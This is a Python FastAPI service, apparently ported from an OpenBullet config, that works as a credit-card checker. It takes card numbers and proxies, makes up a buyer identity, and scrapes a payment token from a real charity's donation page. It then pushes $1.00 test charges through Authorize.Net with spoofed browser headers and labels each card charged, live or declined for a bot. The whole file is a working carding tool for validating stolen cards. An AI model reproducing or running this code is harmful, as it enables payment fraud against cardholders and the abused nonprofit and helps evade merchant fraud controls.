import os
import re
import html
import random
import string
from urllib.parse import quote_plus, quote, urlparse
from typing import Optional

import httpx
from fastapi import FastAPI, Query, HTTPException

app = FastAPI(title="AuthNet Gateway API", version="1.0.0")

# ---------------------------------------------
# CONFIG
# ---------------------------------------------
DEFAULT_TIMEOUT = 45
REQUEST_TIMEOUT = httpx.Timeout(DEFAULT_TIMEOUT, connect=15.0)

CHROME_UA = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/150.0.0.0 Safari/537.36"
)
RANDOM_USER_UA = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/80.0.3987.149 Safari/537.36"
)


# ---------------------------------------------
# HELPERS
# ---------------------------------------------
def parse_card(card: str):
    """
    Accepts: cc|mm|yy|cvv  (also tolerant of spaces, /, :)
    Returns (cc, mm, yy_2digits, cvv)
    """
    normalized = card.replace("/", "|").replace(":", "|").replace(" ", "")
    parts = normalized.split("|")
    if len(parts) != 4:
        raise ValueError("card must be cc|mm|yy|cvv")
    cc, mm, yy, cvv = [p.strip() for p in parts]

    if not (cc.isdigit() and len(cc) in (15, 16)):
        raise ValueError("invalid cc")
    if not (mm.isdigit() and 1 <= int(mm) <= 12):
        raise ValueError("invalid mm")
    if not (yy.isdigit() and len(yy) in (2, 4)):
        raise ValueError("invalid yy")
    if len(yy) == 4:
        yy = yy[-2:]
    if not (cvv.isdigit() and len(cvv) in (3, 4)):
        raise ValueError("invalid cvv")
    return cc, mm, yy, cvv


def build_proxy_url(proxy: Optional[str]) -> Optional[str]:
    """Convert ip:port[:user:pass] to a full httpx proxy URL."""
    if not proxy:
        return None
    parts = proxy.strip().split(":")
    if len(parts) == 2:
        return f"http://{parts[0]}:{parts[1]}"
    if len(parts) == 4:
        return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    raise ValueError("proxy must be ip:port or ip:port:user:pass")


def split_cc(cc: str):
    """
    Mirrors the OB Substring blocks:
    <1>=cc[0:4], <2>=cc[4:8], <3>=cc[8:12], <4>=cc[12:16]
    """
    return cc[0:4], cc[4:8], cc[8:12], cc[12:16]


def format_cn(cc: str) -> str:
    a, b, c, d = split_cc(cc)
    return f"{a}+{b}+{c}+{d}"


def parse_json_field(source: str, key: str) -> Optional[str]:
    """Naive 'JSON field' extractor (falls back to LR between quotes)."""
    m = re.search(rf'"{re.escape(key)}"\s*:\s*"([^"]*)"', source)
    return m.group(1) if m else None


def parse_lr(source: str, left: str, right: str) -> Optional[str]:
    """OpenBullet-style LR parse."""
    idx = source.find(left)
    if idx == -1:
        return None
    idx += len(left)
    end = source.find(right, idx)
    if end == -1:
        return None
    return source[idx:end]


def extract_cf_cookie(set_cookie_headers, name: str) -> Optional[str]:
    """Pull a specific cookie value out of Set-Cookie headers."""
    for h in set_cookie_headers:
        # Set-Cookie: __cf_bm=xxxx; Path=/; ...
        first = h.split(";", 1)[0].strip()
        if first.startswith(name + "="):
            return first.split("=", 1)[1]
    return None


# ---------------------------------------------
# MAIN CHECK FUNCTION
# ---------------------------------------------
async def authnet_check(card: str, proxy: Optional[str] = None) -> dict:
    """
    Mirrors the OB config exactly. Returns:
      {
        "status":   "charged" | "live" | "declined" | "error",
        "message":  "raw message",
        "raw":      full API response text,
        "card":     masked cc,
        "code":     "Ok" | "Error",
      }
    """
    try:
        cc, mm, yy, cvv = parse_card(card)
    except ValueError as e:
        return {
            "status": "error",
            "message": f"bad_card: {e}",
            "raw": "",
            "card": card[:6] + "..." + card[-4:] if len(card) >= 10 else card,
            "code": None,
        }

    masked = f"{cc[:6]}...{cc[-4:]}"
    cn = format_cn(cc)
    # OB's "Translate 20 -> ''" on <ano> strips the first two chars; here
    # yy is already 2 digits (e.g. 28), so AN is just yy.
    an = yy

    proxy_url = build_proxy_url(proxy)

    try:
        async with httpx.AsyncClient(
            timeout=REQUEST_TIMEOUT,
            follow_redirects=True,
            verify=False,
            proxy=proxy_url,   # httpx >= 0.26
        ) as client:

            # ---------------- STEP 1: fake identity ----------------
            r1 = await client.get(
                "https://randomuser.me/api/",
                headers={
                    "User-Agent": RANDOM_USER_UA,
                    "Pragma": "no-cache",
                    "Accept": "*/*",
                },
            )
            first = parse_lr(r1.text, '"first":"', '","') or "John"
            last = parse_json_field(r1.text, "last") or "Smith"
            email = f"{first}@gmail.com"
            email_enc = quote_plus(email)
            first_enc = quote_plus(first)

            # ---------------- STEP 2: get token from merchant ----------------
            donate_url = (
                "https://simchaconnections.org/donate-redirect/"
                f"?amount=1.00&first={first_enc}&{quote_plus(last)}=jack"
                f"&email={email_enc}&addr1=64+nroth&city=ny&state=ny"
                f"&zip=10080&country=UY&phone=%2B15702636648"
            )
            r2 = await client.get(
                donate_url,
                headers={
                    "Host": "simchaconnections.org",
                    "Cache-Control": "max-age=0",
                    "Accept-Language": "en-US,en;q=0.9",
                    "Upgrade-Insecure-Requests": "1",
                    "User-Agent": CHROME_UA,
                    "Accept": (
                        "text/html,application/xhtml+xml,application/xml;q=0.9,"
                        "image/avif,image/webp,image/apng,*/*;q=0.8,"
                        "application/signed-exchange;v=b3;q=0.7"
                    ),
                    "Sec-Fetch-Site": "same-origin",
                    "Sec-Fetch-Mode": "navigate",
                    "Sec-Fetch-User": "?1",
                    "Sec-Fetch-Dest": "document",
                    'Sec-Ch-Ua': '"Not;A=Brand";v="8", "Chromium";v="150"',
                    "Sec-Ch-Ua-Mobile": "?0",
                    'Sec-Ch-Ua-Platform': '"Windows"',
                    "Referer": "https://simchaconnections.org/donate/",
                    "Accept-Encoding": "gzip, deflate, br",
                    "Priority": "u=0, i",
                },
            )

            token = parse_lr(
                r2.text,
                '<input type="hidden" name="token" value="',
                '"',
            )
            if not token:
                return {
                    "status": "error",
                    "message": "no_token_from_merchant",
                    "raw": r2.text[:500],
                    "card": masked,
                    "code": None,
                }
            token_enc = quote_plus(token)

            # ---------------- STEP 3: POST token -> accept.authorize.net ----------------
            r3 = await client.post(
                "https://accept.authorize.net/payment/payment",
                content=f"token={token_enc}",
                headers={
                    "Host": "accept.authorize.net",
                    "Cache-Control": "max-age=0",
                    'Sec-Ch-Ua': '"Not;A=Brand";v="8", "Chromium";v="150"',
                    "Sec-Ch-Ua-Mobile": "?0",
                    'Sec-Ch-Ua-Platform': '"Windows"',
                    "Accept-Language": "en-US,en;q=0.9",
                    "Upgrade-Insecure-Requests": "1",
                    "User-Agent": CHROME_UA,
                    "Origin": "https://simchaconnections.org",
                    "Accept": (
                        "text/html,application/xhtml+xml,application/xml;q=0.9,"
                        "image/avif,image/webp,image/apng,*/*;q=0.8,"
                        "application/signed-exchange;v=b3;q=0.7"
                    ),
                    "Sec-Fetch-Site": "cross-site",
                    "Sec-Fetch-Mode": "navigate",
                    "Sec-Fetch-User": "?1",
                    "Sec-Fetch-Dest": "document",
                    "Referer": "https://simchaconnections.org/",
                    "Accept-Encoding": "gzip, deflate, br",
                    "Priority": "u=0, i",
                    "Content-Type": "application/x-www-form-urlencoded",
                },
            )

            # Grab Cloudflare cookies out of Set-Cookie headers
            raw_headers = r3.headers.get_list("set-cookie") if hasattr(r3.headers, "get_list") else r3.headers.getall("set-cookie", [])
            cf_bm = extract_cf_cookie(raw_headers, "__cf_bm")
            cfuvid = extract_cf_cookie(raw_headers, "_cfuvid")
            # Fall back to client cookie jar if headers didn't expose them
            if not cf_bm:
                cf_bm = client.cookies.get("__cf_bm")
            if not cfuvid:
                cfuvid = client.cookies.get("_cfuvid")

            cookie_header = ""
            if cf_bm and cfuvid:
                cookie_header = f"__cf_bm={cf_bm}; _cfuvid={cfuvid}"
            elif cf_bm:
                cookie_header = f"__cf_bm={cf_bm}"

            # ---------------- STEP 4: submit card ----------------
            # NOTE: OB does creditCard=<CN> where CN = "4031+6314+7363+9406"
            # (literal '+' separators) — replicate exactly, DO NOT url-encode cn.
            an_enc = quote_plus(an)
            body = (
                f"token={token_enc}"
                f"&totalAmount=1.00"
                f"&paymentMethod=cc"
                f"&creditCard={cn}"
                f"&expirationDate={mm}%2F{an_enc}"
                f"&cardCode={cvv}"
                f"&billingInfo%5BfirstName%5D=max"
                f"&billingInfo%5BlastName%5D=jack"
                f"&billingInfo%5Bcompany%5D="
                f"&billingInfo%5Baddress%5D=64+nroth"
                f"&billingInfo%5Bcity%5D=ny"
                f"&billingInfo%5Bstate%5D=ny"
                f"&billingInfo%5Bzip%5D=10080"
                f"&billingInfo%5Bcountry%5D=US"
                f"&billingInfo%5BphoneNumber%5D=+15702636648"
                f"&billingInfo%5BfaxNumber%5D="
                f"&email={email_enc}"
            )

            submit_headers = {
                "Host": "accept.authorize.net",
                "Sec-Ch-Ua-Platform": '"Windows"',
                "Accept-Language": "en-US,en;q=0.9",
                "Accept": "application/json",
                'Sec-Ch-Ua': '"Not;A=Brand";v="8", "Chromium";v="150"',
                "Sec-Ch-Ua-Mobile": "?0",
                "User-Agent": CHROME_UA,
                "Origin": "https://accept.authorize.net",
                "Sec-Fetch-Site": "same-origin",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Dest": "empty",
                "Referer": "https://accept.authorize.net/payment/payment",
                "Accept-Encoding": "gzip, deflate, br",
                "Priority": "u=1, i",
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            }
            if cookie_header:
                submit_headers["Cookie"] = cookie_header

            r4 = await client.post(
                "https://accept.authorize.net/Payment/Api.ashx",
                content=body,
                headers=submit_headers,
            )

            raw_text = r4.text
            # ---------------- PARSE resultCode / messageText ----------------
            result_code = parse_json_field(raw_text, "resultCode") or ""
            message_text = parse_json_field(raw_text, "messageText") or ""
            message_code = parse_json_field(raw_text, "messageCode") or ""

            # ---------------- CLASSIFY ----------------
            if result_code.lower() == "ok":
                status = "charged"
            else:
                # Error branch. Distinguish auth-side outcomes:
                msg_l = message_text.lower()
                if any(k in msg_l for k in (
                    "3d", "otp", "verification", "authentication",
                    "requires_action", "redirect"
                )):
                    status = "live"
                elif "declined" in msg_l or result_code.lower() == "error":
                    status = "declined"
                else:
                    status = "error"

            return {
                "status": status,
                "message": message_text or f"resultCode={result_code} code={message_code}",
                "raw": raw_text,
                "card": masked,
                "code": result_code or None,
            }

    except httpx.TimeoutException:
        return {
            "status": "error",
            "message": "request_timeout",
            "raw": "",
            "card": masked,
            "code": None,
        }
    except httpx.HTTPError as e:
        return {
            "status": "error",
            "message": f"http_error: {type(e).__name__}: {e}",
            "raw": "",
            "card": masked,
            "code": None,
        }
    except Exception as e:
        return {
            "status": "error",
            "message": f"{type(e).__name__}: {e}",
            "raw": "",
            "card": masked,
            "code": None,
        }


# ---------------------------------------------
# ENDPOINTS
# ---------------------------------------------
@app.get("/authnet")
async def authnet_endpoint(
    card: str = Query(..., description="Card as cc|mm|yy|cvv"),
    proxy: Optional[str] = Query(None, description="ip:port or ip:port:user:pass"),
):
    """
    Single card check against Authorize.Net (Simcha Connections donate flow).
    Bot-compatible response shape:
      {
        "success":  bool,
        "status":   "charged" | "live" | "declined" | "error",
        "message":  "...",
        "raw":      "<full raw API text>",
        "card":     "403163...9406",
        "code":     "Ok" | "Error" | null,
        "amount":   "$1.00",
        "currency": "USD"
      }
    """
    try:
        result = await authnet_check(card=card, proxy=proxy)
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"{type(e).__name__}: {e}")

    success = result["status"] in ("charged", "live")
    return {
        "success": success,
        "status": result["status"],
        "message": result["message"],
        "raw": result["raw"],
        "card": result["card"],
        "code": result["code"],
        "amount": "$1.00",
        "currency": "USD",
    }


@app.get("/")
async def root():
    return {"status": "online", "endpoints": ["/authnet", "/docs"]}


# ---------------------------------------------
# ENTRYPOINT
# ---------------------------------------------
if __name__ == "__main__":
    import uvicorn
    uvicorn.run("authnet_api:app", host="0.0.0.0", port=8001, reload=False)
